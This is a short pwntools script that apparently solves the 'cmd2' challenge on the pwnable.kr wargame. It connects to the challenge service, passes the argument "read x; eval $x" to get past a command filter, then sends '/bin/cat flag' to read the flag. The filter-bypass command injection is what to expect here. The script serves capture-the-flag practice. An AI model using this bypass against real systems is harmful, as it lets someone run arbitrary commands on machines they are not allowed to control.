from pwn import *

p = remote('pwnable.kr','10013')

p.sendlineafter(b'CMD2 Shell', b"./cmd2 'read x; eval $x'")
p.sendline(b'/bin/cat flag')

p.interactive()